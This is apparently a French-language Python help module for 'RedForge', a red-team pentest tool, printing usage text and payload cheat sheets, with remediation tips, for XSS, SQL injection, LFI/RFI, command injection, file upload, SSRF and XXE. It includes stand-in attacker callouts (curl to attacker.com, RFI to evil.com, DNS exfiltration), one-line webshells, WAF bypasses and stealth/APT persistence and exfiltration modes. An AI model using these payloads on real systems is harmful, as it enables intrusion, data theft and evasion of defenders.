#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de gestion d'aide pour RedForge
Gère la documentation et l'aide contextuelle
Version avec support APT, mode furtif et documentation avancée
"""

import json
import os
from typing import Dict, Any, List, Optional
from pathlib import Path
from datetime import datetime

from src.utils.color_output import console, print_header, print_info, print_success, print_warning, print_error


class HelpManager:
    """Gestionnaire d'aide et de documentation avancé"""
    
    def __init__(self, lang: str = "fr"):
        """
        Initialise le gestionnaire d'aide
        
        Args:
            lang: Langue (fr, en)
        """
        self.lang = lang
        self.help_data = self._load_help_data()
        self.stealth_mode = False
        self.apt_mode = False
    
    def set_stealth_mode(self, enabled: bool):
        """Active/désactive le mode furtif"""
        self.stealth_mode = enabled
    
    def set_apt_mode(self, enabled: bool):
        """Active/désactive le mode APT"""
        self.apt_mode = enabled
    
    def _load_help_data(self) -> Dict[str, Any]:
        """Charge les données d'aide depuis les fichiers JSON"""
        help_data = {}
        
        # Chemins possibles
        paths = [
            Path(__file__).parent.parent / "i18n" / self.lang / "help_texts.json",
            Path(__file__).parent.parent / "i18n" / "fr_FR" / "help_texts.json",
            Path(__file__).parent.parent / "i18n" / "fr" / "help_texts.json"
        ]
        
        for path in paths:
            if path.exists():
                try:
                    with open(path, 'r', encoding='utf-8') as f:
                        help_data = json.load(f)
                        break
                except:
                    pass
        
        return help_data
    
    def show_help(self, topic: Optional[str] = None, section: Optional[str] = None):
        """
        Affiche l'aide
        
        Args:
            topic: Sujet spécifique (optionnel)
            section: Section spécifique (optionnel)
        """
        if self.apt_mode:
            self._show_apt_help()
        elif topic:
            self._show_topic_help(topic, section)
        else:
            self._show_general_help()
    
    def _show_general_help(self):
        """Affiche l'aide générale"""
        print_header("RedForge - Aide Générale v2.0")
        
        # Syntaxe de base
        print_info("\n📖 SYNTAXE DE BASE")
        print_info("  RedForge [OPTIONS] [ARGUMENTS]\n")
        
        # Options principales
        print_info("🔧 OPTIONS PRINCIPALES")
        table_data = [
            ("-t, --target", "Cible à analyser", "RedForge -t example.com"),
            ("-f, --file", "Fichier de cibles", "RedForge -f cibles.txt"),
            ("-p, --phase", "Phase à exécuter", "RedForge -t example.com -p scan"),
            ("-g, --gui", "Interface graphique", "sudo RedForge -g"),
            ("-o, --output", "Fichier de rapport", "RedForge -t example.com -o rapport.html"),
            ("--mode", "Mode d'exécution", "RedForge --mode stealth"),
            ("--stealth", "Mode furtif", "RedForge --stealth"),
            ("--apt", "Mode APT", "RedForge --apt --duration 86400"),
            ("--help", "Afficher l'aide", "RedForge --help"),
            ("--aide-commande", "Aide spécifique", "RedForge --aide-commande footprint")
        ]
        
        console.print_table(
            headers=["Option", "Description", "Exemple"],
            rows=table_data
        )
        
        # Modes d'exécution
        print_info("\n🎭 MODES D'EXÉCUTION")
        modes = [
            ("standard", "Mode normal", "Détectable, rapide"),
            ("stealth", "Mode furtif", "Discret, ralentit les requêtes"),
            ("apt", "Mode APT", "Ultra discret, opération prolongée")
        ]
        
        console.print_table(
            headers=["Mode", "Description", "Caractéristiques"],
            rows=modes
        )
        
        # Phases disponibles
        print_info("\n📊 PHASES DISPONIBLES")
        phases = [
            ("footprint", "Reconnaissance", "Collecte d'informations initiale"),
            ("analysis", "Analyse", "Analyse approfondie de l'application"),
            ("scan", "Scan", "Détection de vulnérabilités"),
            ("exploit", "Exploitation", "Exploitation des vulnérabilités"),
            ("all", "Complet", "Toutes les phases")
        ]
        
        console.print_table(
            headers=["Phase", "Description", "Détails"],
            rows=phases
        )
        
        # Exemples
        print_info("\n💡 EXEMPLES D'UTILISATION")
        examples = [
            "Scan rapide : RedForge -t https://example.com -p footprint",
            "Scan complet : RedForge -t 192.168.1.100 -p all -o rapport.html",
            "Scan furtif : RedForge -t example.com --stealth -p scan",
            "Opération APT : RedForge -t example.com --apt --duration 86400",
            "Planification : RedForge -t example.com --schedule '0 2 * * *'",
            "Force brute : RedForge -t example.com -p exploit --bruteforce",
            "Interface graphique : sudo RedForge -g"
        ]
        
        for ex in examples:
            print_info(f"  {ex}")
        
        # Aide spécifique
        print_info("\n❓ POUR PLUS D'AIDE")
        print_info("  RedForge --aide-commande footprint")
        print_info("  RedForge --aide-commande exploit")
        print_info("  RedForge --aide-commande apt")
        print_info("  RedForge --liste-modules")
        
        # Documentation
        print_info("\n📚 DOCUMENTATION")
        print_info("  Site web: https://redforge.io")
        print_info("  Documentation: https://redforge.io/docs")
        print_info("  GitHub: https://github.com/redteam/redforge")
        print_info("  Discord: https://discord.gg/redforge")
    
    def _show_apt_help(self):
        """Affiche l'aide pour le mode APT (discret)"""
        print_info("\n" + "=" * 50)
        print_info("APT Mode - Aide discrète")
        print_info("=" * 50)
        
        print_info("\n🎭 OPÉRATIONS APT")
        print_info("  • full     - Opération APT complète")
        print_info("  • recon    - Reconnaissance prolongée")
        print_info("  • persist  - Établissement de persistance")
        print_info("  • exfil    - Exfiltration de données")
        
        print_info("\n⏱️ DURÉE")
        print_info("  --duration 86400  # Durée en secondes (défaut: 24h)")
        
        print_info("\n📅 PLANIFICATION")
        print_info("  --schedule '0 2 * * *'  # Format cron")
        
        print_info("\n🕵️ EXEMPLES")
        print_info("  RedForge -t example.com --apt --operation full")
        print_info("  RedForge -t example.com --apt --duration 604800")
        print_info("  RedForge -t example.com --apt --schedule '0 2 * * *'")
    
    def _show_topic_help(self, topic: str, section: Optional[str] = None):
        """
        Affiche l'aide pour un sujet spécifique
        
        Args:
            topic: Sujet demandé
            section: Section spécifique
        """
        topics = {
            'footprint': self._show_footprint_help,
            'analysis': self._show_analysis_help,
            'scan': self._show_scan_help,
            'exploit': self._show_exploit_help,
            'apt': self._show_apt_help,
            'stealth': self._show_stealth_help,
            'xss': self._show_xss_help,
            'sql': self._show_sql_help,
            'lfi': self._show_lfi_help,
            'command': self._show_command_help,
            'upload': self._show_upload_help,
            'csrf': self._show_csrf_help,
            'ssrf': self._show_ssrf_help,
            'xxe': self._show_xxe_help
        }
        
        if topic in topics:
            topics[topic]()
        else:
            print_warning(f"Sujet '{topic}' non trouvé")
            self._list_available_topics()
    
    def _show_footprint_help(self):
        """Aide pour la phase footprint"""
        print_header("Phase 1: Footprinting - Reconnaissance")
        
        print_info("📝 DESCRIPTION")
        print_info("  Collecte d'informations sur la cible sans être intrusif.")
        
        print_info("\n🎯 CE QUE CETTE PHASE DÉCOUVRE")
        discoveries = [
            "Adresses IP et sous-domaines",
            "Services et ports ouverts",
            "Technologies web utilisées (CMS, frameworks, langages)",
            "Serveurs DNS et emails",
            "Certificats SSL/TLS",
            "Firewalls et systèmes de protection",
            "Système d'exploitation distant"
        ]
        
        for d in discoveries:
            print_info(f"  • {d}")
        
        print_info("\n⚙️ OPTIONS SPÉCIFIQUES")
        options = [
            ("--dns-enum", "Énumération DNS complète"),
            ("--subdomains", "Découverte de sous-domaines"),
            ("--tech-detect", "Détection des technologies"),
            ("--no-ping", "Ne pas pinguer la cible"),
            ("--os-detect", "Détection du système d'exploitation"),
            ("--port-scan", "Scan des ports spécifiques")
        ]
        
        for opt, desc in options:
            print_info(f"  {opt:<20} {desc}")
        
        print_info("\n📊 EXEMPLES")
        print_info("  RedForge -t example.com -p footprint")
        print_info("  RedForge -t example.com -p footprint --dns-enum --subdomains")
        print_info("  RedForge -f cibles.txt -p footprint --tech-detect")
        print_info("  RedForge -t 192.168.1.0/24 -p footprint --port-scan")
        
        print_info("\n📁 FICHIERS GÉNÉRÉS")
        print_info("  ~/.RedForge/workspace/footprint_[cible].json")
        print_info("  ~/.RedForge/workspace/nmap_[cible].xml")
        print_info("  ~/.RedForge/workspace/subdomains_[cible].txt")
    
    def _show_analysis_help(self):
        """Aide pour la phase analysis"""
        print_header("Phase 2: Analysis - Analyse Approfondie")
        
        print_info("📝 DESCRIPTION")
        print_info("  Analyse détaillée de l'application web et de son fonctionnement.")
        
        print_info("\n🎯 CE QUE CETTE PHASE ANALYSE")
        analyses = [
            "Structure des répertoires et fichiers cachés",
            "Paramètres GET/POST et formulaires",
            "Points d'entrée utilisateur",
            "Système d'authentification et sessions",
            "API endpoints (REST, GraphQL, SOAP)",
            "Fichiers JavaScript et leurs endpoints",
            "Workflows et logique métier"
        ]
        
        for a in analyses:
            print_info(f"  • {a}")
        
        print_info("\n⚙️ OPTIONS SPÉCIFIQUES")
        options = [
            ("--dir-bruteforce", "Force brute des répertoires"),
            ("--param-finder", "Découverte de paramètres cachés"),
            ("--api-detect", "Détection d'APIs REST/GraphQL"),
            ("--js-analyze", "Analyse JavaScript"),
            ("--wordlist", "Fichier wordlist personnalisé"),
            ("--recursive", "Scan récursif des répertoires")
        ]
        
        for opt, desc in options:
            print_info(f"  {opt:<20} {desc}")
        
        print_info("\n📊 EXEMPLES")
        print_info("  RedForge -t example.com -p analysis")
        print_info("  RedForge -t example.com -p analysis --dir-bruteforce --recursive")
        print_info("  RedForge -t example.com -p analysis --api-detect --js-analyze")
    
    def _show_scan_help(self):
        """Aide pour la phase scan"""
        print_header("Phase 3: Scanning - Scan de Vulnérabilités")
        
        print_info("📝 DESCRIPTION")
        print_info("  Détection automatisée des vulnérabilités web.")
        
        print_info("\n🎯 VULNÉRABILITÉS DÉTECTÉES")
        vulns = [
            "Injections SQL (SQLi) - Tous types",
            "Cross-Site Scripting (XSS) - Réfléchi, stocké, DOM",
            "LFI/RFI (Local/Remote File Inclusion)",
            "Command Injection",
            "CSRF (Cross-Site Request Forgery)",
            "SSRF (Server-Side Request Forgery)",
            "XXE (XML External Entity)",
            "Open Redirect",
            "IDOR (Insecure Direct Object Reference)"
        ]
        
        for v in vulns:
            print_info(f"  • {v}")
        
        print_info("\n⚙️ OPTIONS SPÉCIFIQUES")
        options = [
            ("--sqlmap", "Scan SQLi avancé avec sqlmap"),
            ("--xss", "Scan XSS complet (XSStrike + Dalfox)"),
            ("--lfi", "Scan LFI/RFI"),
            ("--ssrf", "Scan SSRF avec callback"),
            ("--xxe", "Scan XXE"),
            ("--csrf", "Scan CSRF"),
            ("--level", "Niveau de scan (1-5)"),
            ("--no-js", "Ignorer le JavaScript")
        ]
        
        for opt, desc in options:
            print_info(f"  {opt:<15} {desc}")
        
        print_info("\n📊 EXEMPLES")
        print_info("  RedForge -t example.com -p scan")
        print_info("  RedForge -t example.com -p scan --sqlmap --xss --level 3")
        print_info("  RedForge -t example.com -p scan --lfi --ssrf --xxe")
    
    def _show_exploit_help(self):
        """Aide pour la phase exploit"""
        print_header("Phase 4: Exploitation")
        
        print_info("📝 DESCRIPTION")
        print_info("  Exploitation des vulnérabilités découvertes.")
        
        print_info("\n🎯 CAPACITÉS D'EXPLOITATION")
        capabilities = [
            "Obtention de shell reverse (bind/reverse shell)",
            "Upload de webshells (PHP, ASP, JSP, Python)",
            "Élévation de privilèges (Linux/Windows)",
            "Pillage de données (bases de données, fichiers, credentials)",
            "Persistance sur la cible (cron, services, startup)",
            "Pivotement vers d'autres systèmes",
            "Exfiltration de données discrète"
        ]
        
        for c in capabilities:
            print_info(f"  • {c}")
        
        print_info("\n⚙️ OPTIONS SPÉCIFIQUES")
        options = [
            ("--reverse-shell", "Obtention d'un shell reverse"),
            ("--bind-shell", "Bind shell sur la cible"),
            ("--payload", "Payload personnalisé"),
            ("--lhost", "IP du listener"),
            ("--lport", "Port du listener"),
            ("--persistence", "Établir une persistance"),
            ("--cleanup", "Nettoyer les traces")
        ]
        
        for opt, desc in options:
            print_info(f"  {opt:<20} {desc}")
        
        print_info("\n📊 EXEMPLES")
        print_info("  RedForge -t example.com -p exploit")
        print_info("  RedForge -t example.com -p exploit --reverse-shell --lport 5555")
        print_info("  RedForge -t example.com -p exploit --persistence --cleanup")
    
    def _show_stealth_help(self):
        """Aide pour le mode furtif"""
        print_header("Mode Furtif - Stealth Mode")
        
        print_info("📝 DESCRIPTION")
        print_info("  Mode d'exécution discret qui ralentit les requêtes pour éviter la détection.")
        
        print_info("\n🎯 NIVEAUX DE FURTIVITÉ")
        levels = [
            ("low", "Faible", "0.1-0.5s", "Détectable"),
            ("medium", "Moyen", "0.5-2s", "Moyennement discret"),
            ("high", "Élevé", "2-5s", "Très discret"),
            ("extreme", "Extrême", "5-15s", "Ultra discret")
        ]
        
        console.print_table(
            headers=["Niveau", "Délais", "Caractéristiques"],
            rows=levels
        )
        
        print_info("\n⚙️ OPTIONS")
        print_info("  --stealth                Active le mode furtif")
        print_info("  --stealth-level <level>  Définit le niveau (low/medium/high/extreme)")
        print_info("  --delay-min <seconds>    Délai minimum entre requêtes")
        print_info("  --delay-max <seconds>    Délai maximum entre requêtes")
        print_info("  --proxy <url>            Utilise un proxy")
        print_info("  --user-agent <ua>        User-Agent personnalisé")
    
    def _show_xss_help(self):
        """Aide spécifique XSS"""
        print_header("Cross-Site Scripting (XSS)")
        
        print_info("📝 TYPES DE XSS")
        print_info("  • Réfléchi (Reflected) - Le payload est réfléchi dans la réponse")
        print_info("  • Stocké (Stored) - Le payload est stocké sur le serveur")
        print_info("  • DOM-based - Le payload modifie le DOM côté client")
        print_info("  • Blind XSS - Le payload s'exécute dans un contexte différent")
        
        print_info("\n🎯 PAYLOADS DE TEST")
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "'\"><script>alert('XSS')</script>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>"
        ]
        
        for p in payloads:
            print_info(f"  {p}")
        
        print_info("\n🛡️ CONTOURNEMENT DE WAF")
        bypasses = [
            "<ScRiPt>alert('XSS')</ScRiPt> (case manipulation)",
            "%3Cscript%3Ealert('XSS')%3C/script%3E (URL encoding)",
            "<svg/onload=alert`XSS`> (backticks)",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;> (decimal encoding)"
        ]
        
        for b in bypasses:
            print_info(f"  {b}")
        
        print_info("\n🛡️ REMÉDIATION")
        print_info("  • Échapper les sorties HTML")
        print_info("  • Utiliser CSP (Content Security Policy)")
        print_info("  • Valider les entrées utilisateur")
        print_info("  • Utiliser HttpOnly sur les cookies")
    
    def _show_sql_help(self):
        """Aide spécifique SQL Injection"""
        print_header("Injection SQL (SQLi)")
        
        print_info("📝 TYPES D'INJECTION SQL")
        sql_types = [
            ("Error-based", "Exploitation via messages d'erreur", "Facile"),
            ("Union-based", "Utilisation de UNION SELECT", "Moyen"),
            ("Boolean-based", "Différences de réponse (True/False)", "Moyen"),
            ("Time-based", "Délais de réponse (SLEEP)", "Difficile"),
            ("Out-of-band", "Exfiltration de données via DNS/HTTP", "Difficile")
        ]
        
        console.print_table(
            headers=["Type", "Description", "Difficulté"],
            rows=sql_types
        )
        
        print_info("\n🎯 PAYLOADS DE TEST")
        payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]
        
        for p in payloads:
            print_info(f"  {p}")
        
        print_info("\n🗄️ DÉTECTION DU SGBD")
        print_info("  • MySQL: version(), database(), user()")
        print_info("  • PostgreSQL: version(), current_database(), current_user")
        print_info("  • MSSQL: @@VERSION, DB_NAME(), SYSTEM_USER")
        print_info("  • Oracle: SELECT version FROM v$instance, SELECT user FROM dual")
        
        print_info("\n🛡️ REMÉDIATION")
        print_info("  • Utiliser des requêtes paramétrées")
        print_info("  • Échapper les entrées utilisateur")
        print_info("  • Utiliser un ORM")
        print_info("  • Appliquer le principe du moindre privilège")
    
    def _show_lfi_help(self):
        """Aide spécifique LFI/RFI"""
        print_header("LFI/RFI - Inclusion de Fichiers")
        
        print_info("📝 TYPES")
        print_info("  • LFI (Local File Inclusion) - Inclusion de fichiers locaux")
        print_info("  • RFI (Remote File Inclusion) - Inclusion de fichiers distants")
        
        print_info("\n🎯 PAYLOADS LFI")
        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//etc/passwd",
            "..;/..;/etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        
        for p in lfi_payloads:
            print_info(f"  {p}")
        
        print_info("\n🎯 PAYLOADS RFI")
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "//evil.com/shell.php",
            "ftp://evil.com/shell.php",
            "http://evil.com/shell.php?cmd=id"
        ]
        
        for p in rfi_payloads:
            print_info(f"  {p}")
        
        print_info("\n📝 LOG POISONING")
        print_info("  • Apache: /var/log/apache2/access.log")
        print_info("  • Nginx: /var/log/nginx/access.log")
        print_info("  • Injection via User-Agent: <?php system($_GET['cmd']); ?>")
        
        print_info("\n🛡️ REMÉDIATION")
        print_info("  • Valider les chemins")
        print_info("  • Utiliser des listes blanches")
        print_info("  • Désactiver allow_url_include")
        print_info("  • Configurer open_basedir")
    
    def _show_command_help(self):
        """Aide spécifique Command Injection"""
        print_header("Injection de Commandes")
        
        print_info("📝 SÉPARATEURS DE COMMANDES")
        separators = [
            (";", "Exécute la commande suivante (Unix/Windows)"),
            ("|", "Pipe la sortie d'une commande vers une autre"),
            ("||", "OU logique (exécute si la première échoue)"),
            ("&", "Exécute en arrière-plan (Unix)"),
            ("&&", "ET logique (exécute si la première réussit)"),
            ("$()", "Substitution de commande (Unix)"),
            ("``", "Substitution de commande (Unix)"),
            ("%0a", "Nouvelle ligne encodée")
        ]
        
        for sep, desc in separators:
            print_info(f"  {sep:<5} {desc}")
        
        print_info("\n🎯 PAYLOADS DE TEST")
        test_payloads = [
            "; ls",
            "| cat /etc/passwd",
            "& whoami",
            "$(id)",
            "`uname -a`"
        ]
        
        for p in test_payloads:
            print_info(f"  {p}")
        
        print_info("\n🎯 BLIND PAYLOADS")
        blind_payloads = [
            "; ping -c 5 10.0.0.1",
            "| nslookup test.attacker.com",
            "& curl http://attacker.com/$(whoami)",
            "$(sleep 5)"
        ]
        
        for p in blind_payloads:
            print_info(f"  {p}")
        
        print_info("\n🛡️ REMÉDIATION")
        print_info("  • Éviter les appels système")
        print_info("  • Utiliser des API sécurisées")
        print_info("  • Valider et échapper les entrées")
        print_info("  • Utiliser des listes blanches")
    
    def _show_upload_help(self):
        """Aide spécifique File Upload"""
        print_header("Upload de Fichiers")
        
        print_info("📝 TECHNIQUES DE BYPASS")
        bypasses = [
            ("Double extension", "shell.php.jpg"),
            ("Null byte", "shell.php%00.jpg"),
            ("MIME type spoofing", "Content-Type: image/jpeg"),
            ("Magic bytes", "GIF89a<?php ... ?>"),
            ("Case sensitivity", "shell.PHP (sur Windows)"),
            ("Extension alternative", "shell.phtml, shell.php5"),
            ("Content-Disposition", "filename=\"shell.php\"")
        ]
        
        for tech, example in bypasses:
            print_info(f"  • {tech:<20} {example}")
        
        print_info("\n🎯 WEBSHELLS")
        webshells = [
            ("PHP", "<?php system($_GET['cmd']); ?>"),
            ("ASP", "<% eval request('cmd') %>"),
            ("JSP", "<% Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"),
            ("Python", "exec(\"import subprocess; subprocess.call('id', shell=True)\")")
        ]
        
        for lang, code in webshells:
            print_info(f"  • {lang:<6} {code[:50]}...")
        
        print_info("\n🛡️ REMÉDIATION")
        print_info("  • Valider le type MIME")
        print_info("  • Vérifier les extensions")
        print_info("  • Renommer les fichiers")
        print_info("  • Stocker hors du webroot")
        print_info("  • Scanner antivirus")
        print_info("  • Limiter la taille des fichiers")
    
    def _show_csrf_help(self):
        """Aide spécifique CSRF"""
        print_header("Cross-Site Request Forgery (CSRF)")
        
        print_info("📝 DESCRIPTION")
        print_info("  Force un utilisateur authentifié à exécuter des actions non désirées.")
        
        print_info("\n🎯 TYPES D'ATTAQUES")
        print_info("  • GET-based - Via URL malveillante")
        print_info("  • POST-based - Via formulaire caché")
        print_info("  • JSON-based - Via requête AJAX")
        print_info("  • Multi-step - Actions en plusieurs étapes")
        
        print_info("\n🎯 PAYLOADS")
        print_info("  • Image: <img src='http://target.com/delete?id=1'>")
        print_info("  • Formulaire: <form action='http://target.com/delete' method='POST'>")
        print_info("  • JavaScript: fetch('http://target.com/delete', {method: 'POST'})")
        
        print_info("\n🛡️ REMÉDIATION")
        print_info("  • Utiliser des tokens CSRF")
        print_info("  • Vérifier l'en-tête Referer/Origin")
        print_info("  • Utiliser les cookies SameSite")
        print_info("  • Demander une confirmation pour les actions sensibles")
    
    def _show_ssrf_help(self):
        """Aide spécifique SSRF"""
        print_header("Server-Side Request Forgery (SSRF)")
        
        print_info("📝 DESCRIPTION")
        print_info("  Force le serveur à faire des requêtes HTTP non autorisées.")
        
        print_info("\n🎯 PAYLOADS")
        print_info("  • Localhost: http://127.0.0.1, http://localhost")
        print_info("  • Metadata AWS: http://169.254.169.254/latest/meta-data/")
        print_info("  • Metadata GCP: http://metadata.google.internal/")
        print_info("  • File: file:///etc/passwd")
        print_info("  • Internal services: http://localhost:8080, http://localhost:6379")
        
        print_info("\n🎯 BLIND SSRF")
        print_info("  • Utiliser un collaborator: http://collaborator.com")
        print_info("  • Exfiltration DNS: nslookup $(whoami).collaborator.com")
        
        print_info("\n🛡️ REMÉDIATION")
        print_info("  • Valider les URLs")
        print_info("  • Utiliser des listes blanches")
        print_info("  • Bloquer les IPs internes")
        print_info("  • Isoler le serveur")
    
    def _show_xxe_help(self):
        """Aide spécifique XXE"""
        print_header("XML External Entity (XXE)")
        
        print_info("📝 DESCRIPTION")
        print_info("  Exploite les parsers XML pour lire des fichiers ou exécuter des requêtes.")
        
        print_info("\n🎯 PAYLOADS")
        print_info("  • Lecture de fichier:")
        print_info("    <?xml version=\"1.0\"?>")
        print_info("    <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>")
        print_info("    <root>&xxe;</root>")
        
        print_info("\n  • Blind XXE:")
        print_info("    <?xml version=\"1.0\"?>")
        print_info("    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://collaborator.com/xxe\"> %xxe;]>")
        print_info("    <root>test</root>")
        
        print_info("\n🛡️ REMÉDIATION")
        print_info("  • Désactiver les entités externes")
        print_info("  • Utiliser des parsers XML sécurisés")
        print_info("  • Valider les entrées XML")
    
    def _list_available_topics(self):
        """Liste les sujets disponibles"""
        topics = [
            "footprint", "analysis", "scan", "exploit",
            "apt", "stealth", "xss", "sql", "lfi", "command",
            "upload", "csrf", "ssrf", "xxe"
        ]
        
        print_info("\n📚 SUJETS DISPONIBLES")
        for topic in topics:
            print_info(f"  • {topic}")
    
    def show_module_help(self, module_name: str):
        """
        Affiche l'aide pour un module spécifique
        
        Args:
            module_name: Nom du module
        """
        print_header(f"Module: {module_name}")
        
        modules = {
            'nmap': "Scanner réseau - Découverte de ports et services",
            'metasploit': "Framework d'exploitation - Modules d'exploitation",
            'sqlmap': "Injection SQL - Détection et exploitation SQLi",
            'hydra': "Force brute - Attaque par dictionnaire",
            'xsstrike': "XSS - Détection avancée de XSS",
            'wafw00f': "WAF - Détection de pare-feu applicatifs",
            'whatweb': "Technologies - Détection de technologies web",
            'dirb': "Force brute de répertoires",
            'ffuf': "Fuzzing web",
            'gobuster': "Force brute de répertoires et DNS"
        }
        
        if module_name in modules:
            print_info(f"📝 {modules[module_name]}")
        else:
            print_warning(f"Module '{module_name}' non trouvé")
    
    def search_help(self, keyword: str):
        """
        Recherche dans l'aide
        
        Args:
            keyword: Mot-clé à rechercher
        """
        print_header(f"Recherche: {keyword}")
        
        results = []
        
        # Recherche dans les titres et descriptions
        for topic, content in self.help_data.items():
            if isinstance(content, dict):
                title = content.get('title', '')
                description = content.get('description', '')
                
                if keyword.lower() in title.lower() or keyword.lower() in description.lower():
                    results.append(topic)
        
        if results:
            print_info(f"📚 Résultats trouvés ({len(results)}):")
            for topic in results:
                print_info(f"  • {topic}")
            print_info("\n👉 Tapez 'RedForge --aide-commande <sujet>' pour plus de détails")
        else:
            print_warning("Aucun résultat trouvé")
    
    def get_version_help(self) -> str:
        """Retourne l'aide sur la version"""
        from src.core.config import RedForgeConfig
        return f"""
RedForge v{RedForgeConfig.VERSION}
Plateforme d'Orchestration de Pentest Web pour Red Team
100% Français - Compatible Kali Linux & Parrot OS

📦 Modules: {len(self.help_data)} sujets de documentation
🌐 Langue: {self.lang}
📅 Dernière mise à jour: {datetime.now().strftime('%Y-%m-%d')}
"""


# Instance globale
help_manager = HelpManager()


# Point d'entrée pour tests
if __name__ == "__main__":
    print("=" * 60)
    print("Test du gestionnaire d'aide")
    print("=" * 60)
    
    # Aide générale
    help_manager.show_help()
    
    # Aide spécifique
    print("\n" + "=" * 60)
    help_manager.show_help("xss")
    
    # Recherche
    print("\n" + "=" * 60)
    help_manager.search_help("injection")
    
    # Version
    print(help_manager.get_version_help())